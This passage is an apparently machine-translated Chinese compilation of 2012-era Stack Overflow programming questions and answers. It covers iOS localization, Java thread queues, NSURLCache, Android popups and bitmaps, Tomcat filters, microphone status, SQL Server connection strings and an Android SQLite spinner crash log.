最后，（2）可能是最简单的任务：只需删除并重新添加当前视图（或者在某些情况下，只需重新绘制它）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-02-09T00:05:09.977

这个想法是编写一个新的宏`NSLocalizedString`，它应该检查是否从另一个特定的包中获取翻译。

[本文](http://www.factorialcomplexity.com/blog/2015/01/28/how-to-change-localization-internally-in-your-ios-application.html)中的***方法 2***准确地解释了如何做到这一点。在这种特殊情况下，作者没有使用新的宏，而是直接**为**.**`[NSBundle mainBundle]`**

 **我希望@holex 能理解阅读本文的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T09:09:54.573

我一直在使用这种方式，它工作得很好，它也可能对你有帮助。

* * *

您应该在every 的方法中`NSLocalizableString(...)`为`UI`当前语言设置所有文本。`-viewWillAppear:``UIViewController`

使用这种方式，您（我的意思是用户）在更改*Settings*中的语言后**不需要重新启动**应用程序。`iOS`

 ** * *

*当然，我使用的是 Apple 的标准本地化架构。*

# 更新（2013 年 10 月 24 日）

我经历过`–viewWillAppear:`当应用程序进入前台时，不会对实际视图执行该方法；`UIApplicationWillEnterForegroundNotification`为了解决这个问题，当我在视图中收到通知时，我也会提交该过程（见上文） 。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-10-29T17:30:47.573

我的实现使用一个类来更改语言并访问当前的语言包。这是一个示例，因此，如果您要使用与我不同的语言，请更改方法以使用您的确切语言代码。

此类将从 NSLocale 访问首选语言并获取正在使用的语言的第一个对象。

```
@implementation OSLocalization

+ (NSBundle *)currentLanguageBundle
{
    // Default language incase an unsupported language is found
    NSString *language = @"en";

    if ([NSLocale preferredLanguages].count) {
        // Check first object to be of type "en","es" etc
        // Codes seen by my eyes: "en-US","en","es-US","es" etc

        NSString *letterCode = [[NSLocale preferredLanguages] objectAtIndex:0];

        if ([letterCode rangeOfString:@"en"].location != NSNotFound) {
            // English
            language = @"en";
        } else if ([letterCode rangeOfString:@"es"].location != NSNotFound) {
            // Spanish
            language = @"es";
        } else if ([letterCode rangeOfString:@"fr"].location != NSNotFound) {
            // French
            language = @"fr";
        } // Add more if needed
    }

    return [NSBundle bundleWithPath:[[NSBundle mainBundle] pathForResource:language ofType:@"lproj"]];
}

/// Check if preferred language is English
+ (BOOL)isCurrentLanguageEnglish
{
    if (![NSLocale preferredLanguages].count) {
        // Just incase check for no items in array
        return YES;
    }

    if ([[[NSLocale preferredLanguages] objectAtIndex:0] rangeOfString:@"en"].location == NSNotFound) {
        // No letter code for english found
        return NO;
    } else {
        // Tis English
        return YES;
    }
}

/*  Swap language between English & Spanish
 *  Could send a string argument to directly pass the new language
 */
+ (void)changeCurrentLanguage
{
    if ([self isCurrentLanguageEnglish]) {
        [[NSUserDefaults standardUserDefaults] setObject:@[@"es"] forKey:@"AppleLanguages"];
    } else {
        [[NSUserDefaults standardUserDefaults] setObject:@[@"en"] forKey:@"AppleLanguages"];
    }
}
@end 
```

使用上面的类来引用一个字符串文件/图像/视频/等：

```
// Access a localized image
[[OSLocalization currentLanguageBundle] pathForResource:@"my_image_name.png" ofType:nil]
// Access  a localized string from Localizable.strings file
NSLocalizedStringFromTableInBundle(@"StringKey", nil, [OSLocalization currentLanguageBundle], @"comment") 
```

像下面这样在线更改语言或更新上面类中的“changeCurrentLanguage”方法以获取引用新语言代码的字符串参数。

```
// Change the preferred language to Spanish
[[NSUserDefaults standardUserDefaults] setObject:@[@"es"] forKey:@"AppleLanguages"]; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-08T10:44:50.767

我陷入了同样的问题，我的要求是“用户可以从下拉列表中选择语言，并且应用程序必须根据所选语言（英语或阿拉伯语）工作”我所做的我创建了两个 XIB 并根据所选语言获取 XIB 和文本。这样用户可以选择语言。我也使用了 NSBundle。喜欢

对于 XIB

```
self.homeScreen =  [[HomeScreen alloc] initWithNibName:@"HomeScreen" bundle:[CommonData sharedCommonData].languageBundle]; 
```

对于文本

```
_lblHeading.text = [self languageSelectedStringForKey:@"ViewHeadingInfo"];

/**
 This method is responsible for selecting language bundle according to user's selection. 
 @param: the string which is to be converted in selected language. 
 @return: the converted string.
 @throws:
 */

-(NSString*) languageSelectedStringForKey:(NSString*) key

{

    NSString* str=[[CommonData sharedCommonData].languageBundle localizedStringForKey:key value:@"" table:nil];

    return str;

} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-03-02T15:50:14.100

您需要像这样加载另一个包（其中 @"en" 可能是您需要的语言环境）：

```
NSString *path = [[NSBundle mainBundle] pathForResource:@"en" ofType:@"lproj"];
NSBundle *languageBundle = [NSBundle bundleWithPath:path]; 
```

并制作像 NSLocalizedString 这样的宏/函数，它使用您加载的包或直接像这样使用该包上的方法

```
[languageBundle localizedStringForKey:key value:value table:tableName]; 
```

`[[NSBundle mainBundle] localizations]`列出所有应用程序本地化（包括“基础”）。

我还编写了执行此操作的[辅助类](https://github.com/TimurBK/ReactiveLocalizationManager)（请注意，它具有 ReactiveCocoa 作为依赖项）。它允许在不重新启动应用程序的情况下更改语言，并在每次更改时发送当前语言环境。***

# java - 将 Runnable 对象排队以在一个线程中执行

> ID：12192154
> 
> 赞同：0
> 
> 时间：2012-08-30T07:43:39.237
> 
> 标签：java

这是否可以将多个 Runnable 对象排队等待在一个线程中执行？不使用 ExecutorService 怎么办？如果其中一个 Runnable 对象抛出未经检查的异常会发生什么，它会停止执行线程吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T07:48:30.440

> 这是否可以将多个 Runnable 对象排队等待在一个线程中执行？

使用 ExecutorService。

> 不使用 ExecutorService 怎么办？

使用阻塞队列和线程。

> 如果其中一个 Runnable 对象抛出未经检查的异常会发生什么，它会停止执行线程吗？

这取决于你，因为你必须自己写。

对于 ExecutorService，抛出的 Throwable 被添加到 Future 对象中供您检查。很容易忘记这样做，在这种情况下，您需要向 Runnable 添加一个 try/catch 块。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:48:52.513

是否有不使用 ExecutorService 的特定原因？它提供了一个在一个线程中工作的实现：`Executors.newSingleThreadExecutor()`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T07:48:52.677

有可能的。打开一个侦听队列的线程，每次它看到一个项目时，它就会去队列并运行它。您可以将任务的执行包装在 try catch 块中，从而允许工作线程继续工作，即使其中一个任务引发了异常。

话虽如此 - 以上正是 ThreadPoolExecuter 所做的，那么您为什么不想使用它呢？（在家工作？）

# iphone - 在 iOS 上，使用 NSURLConnection 时如何缓存更大的文件（1MB）？

> ID：12192159
> 
> 赞同：2
> 
> 时间：2012-08-30T07:43:44.913
> 
> 标签：iphone, ios, ipad, nsurlconnection, nsurlcache

在 iOS 上，我正在尝试`NSURLConnection`从 Web 服务器加载数据，这些数据只是 PNG 文件。

所有文件都将被缓存，除了一个大小为 1,173,084 字节的文件（大约 1MB）。

我正在循环 6 个文件：pic1.png、pic2.png、... 3、4、5、6，然后返回 1、2、3、... 文件大小分别为 1MB、650kb、450kb 和一些较小的文件。

它正在 iPad 模拟器上进行测试，因此内存不是问题。

已经完成了以下工作`viewDidLoad`：

```
[[NSURLCache sharedURLCache] setMemoryCapacity:15 * 1024 * 1024 ];
[[NSURLCache sharedURLCache] setDiskCapacity:20 * 1024 * 1024 ];

NSLog(@"Memory Cache capacity is %i", [[NSURLCache sharedURLCache] memoryCapacity]);
NSLog(@"Disk Cache capacity is %i", [[NSURLCache sharedURLCache] diskCapacity]); 
```

并且`NSURLConnection`创建于`touchesBegan`：

```
NSURLConnection *connection = [NSURLConnection connectionWithRequest:request 
                                   delegate:self]; 
```

缓存大小为 15MB 和 20MB，远大于总文件大小（约 3.2MB）。如果下载几乎是瞬间完成，我可以看到文件被缓存，而 1MB 的文件经历了很多`connection:didReceiveData`，最后是`connectionDidFinishLoading`.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-05-03T10:42:59.553

NSURLCache 有一个机制来决定哪些文件要缓存或不缓存。最大文件大小与缓存大小有关。尝试将 DiskCapacity 设置为 200 MB。您将看到将被缓存的最大文件大小也将增加。解决这个问题的唯一方法是实现你自己的 NSUrlCache。如果您正在寻找如何执行此操作的示例，请查看 [https://github.com/evermeer/EVURLCache](https://github.com/evermeer/EVURLCache)

# android - 无法在我从资源设置 BG 的位图顶部绘制

> ID：12192160
> 
> 赞同：0
> 
> 时间：2012-08-30T07:43:48.490
> 
> 标签：android, background, bitmap, drawing, drawable

我正在尝试设置背景 ti 位图，然后能够在其上进行绘制，因此稍后我将能够将位图保存到画廊。

```
@Override
protected void onSizeChanged(int w, int h, int oldw, int oldh) {
    paint.setStrokeWidth(changeWidth());
        if (bitmap == null)
               {            
                bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_4444);                   
               }

              //Boolean parameters allowing to change bg in case preference changed
            if(prefs_grid)
                {
                    bitmap = BitmapFactory.decodeResource(getResources(), R.drawable.grid_view);

                }
            if(prefs_ruler)
                {
                    bitmap = BitmapFactory.decodeResource(getResources(), R.drawable.rulers_view);
                }

            canvas = new Canvas();
            try {
                canvas.setBitmap(bitmap);
            } catch (Exception e) {
                e.printStackTrace();
                Log.w("setBitmap", "unable to set Bitmap");
            }
            super.onSizeChanged(w, h, oldw, oldh);
} 
```

这是我更改位图的地方。位图确实发生了变化，但行：canvas.setBitmap(bitmap); 不工作，我不能明白为什么？有人可以就这个问题咨询我。

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T07:45:26.883

尝试添加这个

```
canvas = this.surfaceHolder.lockCanvas(); 
```

// 尝试锁定画布以进行独占像素编辑

// 在表面

# android - Android中弹出窗口上的OnClick事件

> ID：12192164
> 
> 赞同：1
> 
> 时间：2012-08-30T07:44:03.340
> 
> 标签：android, events, popup, onclick

我正在开发应用程序，我必须在我的主要活动中显示弹出窗口，在弹出窗口中我有一个按钮，我需要在其上执行一些操作。

请在下面查看我的代码。该代码没有给出任何错误，但弹出窗口的按钮单击不起作用。

```
imgOpenPopup = (ImageView) findViewById(R.id.places);

        imgOpenPopup.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                LayoutInflater inflater = (LayoutInflater) ConvergeActivity.this
                        .getSystemService(Context.LAYOUT_INFLATER_SERVICE);

                View popupView = inflater.inflate(R.layout.placepopup,(ViewGroup)findViewById(R.layout.maincam));  

                popupWindow = new PopupWindow(inflater.inflate(
                        R.layout.placepopup, null, false), 200, 265, true);

                popupWindow.showAtLocation(findViewById(R.id.places),
                        Gravity.CENTER, 0, 0);

                 objbtnpopupOk=(Button)popupView.findViewById(R.id.btnokpopup); 

                objbtnpopupOk.setOnClickListener(new OnClickListener() 
                { 
                    @Override
                    public void onClick(View v) 
                    { 
                        Toast.makeText(getApplicationContext(), " hi thrtrt  " ,Toast.LENGTH_LONG).show();
                    } 
            }); 

            }
        }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-30T08:49:48.840

我真的不知 道出了什么问题，但[这个解决方案对我有用。](http://android-er.blogspot.com/2012/03/example-of-using-popupwindow.html)

干杯。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-30T08:29:03.033

尝试这个：

```
View popupView = inflater.inflate(R.layout.placepopup,(ViewGroup)findViewById(R.layout.maincam));  
popupWindow = new PopupWindow(popupView, 200, 265, true); 
```

取而代之的是：

```
View popupView = inflater.inflate(R.layout.placepopup,(ViewGroup)findViewById(R.layout.maincam));  
popupWindow = new PopupWindow(inflater.inflate(R.layout.placepopup, null, false), 200, 265, true); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-06-19T13:25:32.393

我是这样做的：

```
 popupWindow.getContentView().setOnClickListener(new OnClickListener()...); 
```

我希望它有所帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T07:48:46.973

尝试从 OnClickListener 中解除弹出窗口的创建，并在 onClick 中调用该方法以显示弹出窗口。它几乎没有优化改进，可以解决您的问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-30T07:50:23.080

你为什么不尝试使用`AlertDialog`. 这将对您有所帮助。阅读此[警报对话框](http://developer.android.com/guide/topics/ui/dialogs.html)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-30T07:51:44.213

在另一个活动中弹出：

将此主题添加到样式文件中，然后将其设置为要在清单文件中弹出的活动。我确信该按钮将在另一个活动中工作。

```
<resources>
<style name="Theme.Transparent" parent="android:Theme"> 
    <item name="android:windowIsTranslucent">true</item> 
    <item name="android:windowBackground">@android:color/transparent</item> 
    <item name="android:windowContentOverlay">@null</item> 
    <item name="android:windowNoTitle">true</item> 
    <item name="android:windowIsFloating">true</item> 
    <item name="android:backgroundDimEnabled">false</item> 
</style> 
```

# ext.net - 是否可以在 ext.net 网格上显示工具提示？

> ID：12192168
> 
> 赞同：0
> 
> 时间：2012-08-30T07:44:16.243
> 
> 标签：ext.net

在 Ext.Net 网格中，是否可以根据鼠标所在的行/列显示包含文本的工具提示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-30T16:45:29.243

以下两个示例应该会有所帮助。

1.  在 GridPanel 行上呈现工具提示

[http://examples.ext.net/#/Miscellaneous/ToolTips/GridPanel_Row_Tooltip/](http://examples.ext.net/#/Miscellaneous/ToolTips/GridPanel_Row_Tooltip/)

1.  在每个单独的 GridPanel 单元格上呈现工具提示

[http://examples.ext.net/#/Miscellaneous/ToolTips/GridPanel_Cell_Tooltip/](http://examples.ext.net/#/Miscellaneous/ToolTips/GridPanel_Cell_Tooltip/)

# jsf-2 - DefaultInstanceManager 无法访问带有修饰符“”的类成员

> ID：12192171
> 
> 赞同：8
> 
> 时间：2012-08-30T07:44:22.157
> 
> 标签：jsf-2, tomcat7, servlet-filters

不知道这里有什么问题，请协助。这是例外：

```
SEVERE: Exception starting filter com.bannerplay.beans.LoginFilter
java.lang.IllegalAccessException: Class org.apache.catalina.core.DefaultInstanceManager can not access a member of class com.bannerplay.beans.LoginFilter with modifiers ""
at sun.reflect.Reflection.ensureMemberAccess(Unknown Source)
at java.lang.Class.newInstance0(Unknown Source)
at java.lang.Class.newInstance(Unknown Source)
at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultInstanceManager.java:134)
at org.apache.catalina.core.ApplicationFilterConfig.getFilter(ApplicationFilterConfig.java:256)
at org.apache.catalina.core.ApplicationFilterConfig.setFilterDef(ApplicationFilterConfig.java:382)
at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFilterConfig.java:103)
at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4650)
at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5306)
at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)
at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)
at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
at java.util.concurrent.FutureTask.run(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
at java.lang.Thread.run(Unknown Source) 
```

登录.xhtml

```
<h:form>
    Username : <h:inputText value="#{loginBean.username}" />
    Password : <h:inputSecret value="#{loginBean.password}" />
<h:commandButton value="Login" action="#{loginBean.checkLogin}" />
</h:form> 
```

web.xml

```
 <filter>
<filter-name>LoginFilter</filter-name>
<filter-class>com.bannerplay.beans.LoginFilter</filter-class>
  </filter>
  <filter-mapping>
<filter-name>LoginFilter</filter-name>
<servlet-name>FacesServlet</servlet-name>
<url-pattern>/admin/*</url-pattern>
  </filter-mapping>
  <welcome-file-list>
     <welcome-file>/login.xhtml</welcome-file>
  </welcome-file-list>
  <servlet>
       <servlet-name>FacesServlet</servlet-name>
       <servlet-class>javax.faces.webapp.FacesServlet</servlet-class>
       <load-on-startup>1</load-on-startup>
  </servlet>
  ... 
```

和 LoginFilter.java

```
import java.io.IOException;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

@WebFilter("/admin/*")
class LoginFilter implements Filter {
@Override
public void doFilter(ServletRequest request , ServletResponse response , FilterChain chain) throws ServletException, IOException {
    HttpSession session = ((HttpServletRequest) request).getSession();
    UserBean userBean = (UserBean) session.getAttribute("userBean");
    if (userBean != null) {
        User user = userBean.getUser();
        if (user == null) {
            ((HttpServletResponse) response).sendRedirect("/login.xhtml");
        } else
            chain.doFilter(request, response);
    } else
        ((HttpServletResponse) response).sendRedirect("/login.xhtml");
}

public void init(FilterConfig fc) {
}

public void destroy() {
}
} 
```

我不知道这个异常来自哪里，请对这个问题有所了解。谢谢！

**EDIT1：**添加 UserBean.java 代码：

```
import java.io.Serializable;
import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;

@ManagedBean
@SessionScoped
class UserBean implements Serializable {
/**
 * 
 */
private static final long serialVersionUID = 1L;

public User getUser() {
    return user;
}

public void setUser(User user) {
    this.user = user;
}

private User user;
} 
```

顺便说一句，严重：上下文 [/projectName] 启动因先前的错误而失败

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-24T15:03:53.013

改变 ：

`class LoginFilter implements Filter {`

至

`public class LoginFilter implements Filter {`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-11-04T12:16:04.273

对我来说，问题在于“构造函数”不是`public`.

# android - 我们可以检查安卓手机的麦克风状态吗，如果可以，我该怎么做

> ID：12192179
> 
> 赞同：3
> 
> 时间：2012-08-30T07:44:45.197
> 
> 标签：android, microphone

我想编写一个程序来检查android手机的内置麦克风是否打开、关闭或被其他应用程序使用。

如果这是可能的，那么我该怎么做？

我在堆栈溢出时阅读了相关问题，但没有找到解决方案。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-04-27T10:52:00.517

这是我用来**检查麦克风是否忙的**方法（基于 Odaym 的回答和我自己的测试）：

（**更新**为 Android 6.0 Marshmallow 兼容性，如评论中所建议）

```
 public static boolean checkIfMicrophoneIsBusy(Context ctx){
        AudioRecord audio = null;
        boolean ready = true;
        try{
            int baseSampleRate = 44100;
            int channel = AudioFormat.CHANNEL_IN_MONO;
            int format = AudioFormat.ENCODING_PCM_16BIT;
            int buffSize = AudioRecord.getMinBufferSize(baseSampleRate, channel, format );
            audio = new AudioRecord(MediaRecorder.AudioSource.MIC, baseSampleRate, channel, format, buffSize );
            audio.startRecording();
            short buffer[] = new short[buffSize];
            int audioStatus = audio.read(buffer, 0, buffSize);

            if(audioStatus == AudioRecord.ERROR_INVALID_OPERATION || audioStatus == AudioRecord.STATE_UNINITIALIZED /* For Android 6.0 */)
                ready = false;
        }
        catch(Exception e){
            ready = false;
        }
        finally {
            try{
                audio.release();
            }
            catch(Exception e){}
        }

        return ready;
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-03-07T11:24:23.297

如果您使用`AudioRecord`对象来录制音频，例如：

```
AudioRecord audio = new AudioRecord(MediaRecorder.AudioSource.MIC,
Constants.SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO,
AudioFormat.ENCODING_PCM_16BIT,Constants.BUFFER_SIZE_BYTES);

audio.startRecording(); 
```

然后紧接着`audio.startRecording()`，你将不得不提供一个缓冲区来读取音频数据，然后开始读取。你这样做：

```
int audioStatus = audio.read(bufferObject, 0, bufferSize); 
```

read()的[Android 文档](http://developer.android.com/reference/android/media/AudioRecord.html#read%28byte%5B%5D,%20int,%20int%29)提到了返回值`ERROR_INVALID_OPERATION`（*常量值：-3*），这仅在麦克风忙时返回，因此您可以在代码中检查它并显示音频源正忙于另一个应用程序的消息.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-30T07:55:16.630

据我所知，*没有办法*知道麦克风的状态（忙碌，可用，..）。对不起

# sql-server - 连接字符串中数据源=（本地）背后的逻辑

> ID：12192184
> 
> 赞同：2
> 
> 时间：2012-08-30T07:44:53.437
> 
> 标签：sql-server, asp.net-mvc, web-config

我的开发机器上有两个 SQL Server 2008 Express 实例和一个 SQL Server 2012 实例。我们正在开发一个 ASP.NET MVC 应用程序并使用表达式 data source=(local); 在 Web.config 中的 connectionString 内部。

现在我的问题是这个表达式背后的逻辑是什么？选择了哪个实例，我该如何改变这种行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-30T07:50:33.277

使用“本地”可以获得默认实例，该实例通常是非快速 SQL Server，因为默认情况下，在 SQL Server Express 安装中，实例名称为“SQLEXPRESS”，而在完整 SQL Server 安装中，默认情况下您不会获得实例名称，除非你明确地设置它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T07:49:40.500

`(local)`just 表示使用当前机器上安装的 SQL Server
以下三种中的任意一种

*   `"(local)"`,
*   `"."`,
*   `".\\SQLEXPRESS"`

可用于利用当前机器中安装的 SQL Server。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-30T08:12:41.463

当你使用`data source="(local)";` 它意味着它连接到本地服务器上的 SQL Server 数据库

您可以在 microsoft 参考中找到更多信息：
[http ://technet.microsoft.com/en-us/library/ms156450(v=sql.100).aspx](http://technet.microsoft.com/en-us/library/ms156450(v=sql.100).aspx)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-30T07:50:20.803

每个实例都有实例名称，因此您可以指定 source=(local)\INSTANCE_NAME。

您可以在 sql server 配置管理器中检查实例及其名称。

# android - 尝试将数据从 SQLiteDatabase 获取到 Spinner [Android] 时出现 NullPointerException

> ID：12192188
> 
> 赞同：0
> 
> 时间：2012-08-30T07:45:11.090
> 
> 标签：android, nullpointerexception, spinner, logcat, sqlite

大家好，我`NullPointerException`在 LogCat 中遇到了。当我打开我的应用程序时，我强制关闭。另外，在 LogCat 中说 Caused by `NullPointerException`at `main.page` `getAllNames()`。所以我认为这与我`getAllNames()`在数据库文件中的方法有关。

我的代码如下：TestSpinnerDB.java

```
@Override
    public void onCreate(Bundle savedInstanceState)
    {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.spinner_test);

        Spinner testSpinner = (Spinner) findViewById(R.id.nameSpinner);
        Cursor testCursor = friendDB.getAllNames();
        startManagingCursor(testCursor);

        String[] from = new String[]{BuddyDBAdapter.KEY_NAME};
        int[] to = new int[]{android.R.id.text1};
        SimpleCursorAdapter testAdapter = new SimpleCursorAdapter(this, android.R.layout.simple_spinner_item, testCursor, from, to);
        testAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        testSpinner.setAdapter(testAdapter);

        testSpinner.setOnItemSelectedListener(new OnItemSelectedListener()
            {

                @Override
                public void onItemSelected(AdapterView<?> parent, View view, int pos, long id)
                {
                    Cursor c = (Cursor)parent.getItemAtPosition(pos);
                    testSpinnerId = c.getInt(c.getColumnIndexOrThrow(BuddyDBAdapter.KEY_ROWID));

                }

                @Override
                public void onNothingSelected(AdapterView<?> arg0)
                {
                    // TODO Auto-generated method stub

                }
            });

    } 
```

BuddyDBAdapter.java

```
public class BuddyDBAdapter extends AnniversaryDBAdapter
{
    public static final String KEY_ROWID = "name_id";
    public static final String KEY_NAME = "name";
    private static final String TAG = "DBAdapter";
    private static final String CREATE_TABLE_BUDDIESLIST = "buddiesList";

    public BuddyDBAdapter(Context ctx)
    {
        super(ctx);
    }

    public long insertNames(String name)
    {
        ContentValues initialValues = new ContentValues();
        initialValues.put(KEY_NAME, name);
        return db.insert(CREATE_TABLE_BUDDIESLIST, null, initialValues);
    }

    public boolean deleteName(long rowId)
    {
        return db.delete(CREATE_TABLE_BUDDIESLIST, KEY_ROWID + "=" + rowId, null) > 0;
    }

    public Cursor getAllNames()
    {
        return db.query(CREATE_TABLE_BUDDIESLIST, new String[] { KEY_ROWID, KEY_NAME }, null, null, null, null, null);
    }

    public Cursor getName(long rowId) throws SQLException
    {
        Cursor c = db.query(true, CREATE_TABLE_BUDDIESLIST, new String[] { KEY_ROWID, KEY_NAME }, KEY_ROWID + "=" + rowId, null, null, null, null, null);
        if(c != null)
        {
            c.moveToFirst();
        }
        return c;
    }
} 
```

这是我的 LogCat

```
08-30 15:03:53.361: I/dalvikvm(715): threadid=3: reacting to signal 3
08-30 15:03:53.381: I/dalvikvm(715): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:03:53.781: D/gralloc_goldfish(715): Emulator without GPU emulation detected.
08-30 15:03:53.871: I/dalvikvm(715): threadid=3: reacting to signal 3
08-30 15:03:53.881: I/dalvikvm(715): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:04:06.101: D/AndroidRuntime(715): Shutting down VM
08-30 15:04:06.101: W/dalvikvm(715): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
08-30 15:04:06.121: E/AndroidRuntime(715): FATAL EXCEPTION: main
08-30 15:04:06.121: E/AndroidRuntime(715): java.lang.RuntimeException: Unable to start activity ComponentInfo{main.page/main.page.TestSpinnerDB}: java.lang.NullPointerException
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.ActivityThread.access$600(ActivityThread.java:123)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.os.Looper.loop(Looper.java:137)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.ActivityThread.main(ActivityThread.java:4424)
08-30 15:04:06.121: E/AndroidRuntime(715):  at java.lang.reflect.Method.invokeNative(Native Method)
08-30 15:04:06.121: E/AndroidRuntime(715):  at java.lang.reflect.Method.invoke(Method.java:511)
08-30 15:04:06.121: E/AndroidRuntime(715):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
08-30 15:04:06.121: E/AndroidRuntime(715):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
08-30 15:04:06.121: E/AndroidRuntime(715):  at dalvik.system.NativeStart.main(Native Method)
08-30 15:04:06.121: E/AndroidRuntime(715): Caused by: java.lang.NullPointerException
08-30 15:04:06.121: E/AndroidRuntime(715):  at main.page.BuddyDBAdapter.getAllNames(BuddyDBAdapter.java:35)
08-30 15:04:06.121: E/AndroidRuntime(715):  at main.page.TestSpinnerDB.onCreate(TestSpinnerDB.java:32)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.Activity.performCreate(Activity.java:4465)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
08-30 15:04:06.121: E/AndroidRuntime(715):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
08-30 15:04:06.121: E/AndroidRuntime(715):  ... 11 more
08-30 15:04:06.481: I/dalvikvm(715): threadid=3: reacting to signal 3
08-30 15:04:06.501: I/dalvikvm(715): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:04:06.661: I/dalvikvm(715): threadid=3: reacting to signal 3
08-30 15:04:06.681: I/dalvikvm(715): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:04:10.601: I/dalvikvm(739): threadid=3: reacting to signal 3
08-30 15:04:10.621: I/dalvikvm(739): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:04:11.011: D/gralloc_goldfish(739): Emulator without GPU emulation detected.
08-30 15:04:11.111: I/dalvikvm(739): threadid=3: reacting to signal 3
08-30 15:04:11.131: I/dalvikvm(739): Wrote stack traces to '/data/anr/traces.txt'
08-30 15:05:10.671: D/AndroidRuntime(739): Shutting down VM
08-30 15:05:10.671: W/dalvikvm(739): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
08-30 15:05:10.711: E/AndroidRuntime(739): FATAL EXCEPTION: main
08-30 15:05:10.711: E/AndroidRuntime(739): java.lang.RuntimeException: Unable to start activity ComponentInfo{main.page/main.page.TestSpinnerDB}: java.lang.NullPointerException
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.ActivityThread.access$600(ActivityThread.java:123)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.os.Looper.loop(Looper.java:137)
08-30 15:05:10.711: E/AndroidRuntime(739):  at android.app.ActivityThread.main(ActivityThread.java:4424)
08-30 15:05:10.711: E/AndroidRuntime(739):  at java.lang.reflect.Method.invokeNative(Native Method)
08-30 15:05:10.711: E/AndroidRuntime(739):  at java.lang.reflect.Method.invoke(Method.java:511)
08-30 15:05:10.711: E/AndroidRuntime(739):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
08-30 15:05:10.711: E/AndroidRuntime(739):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
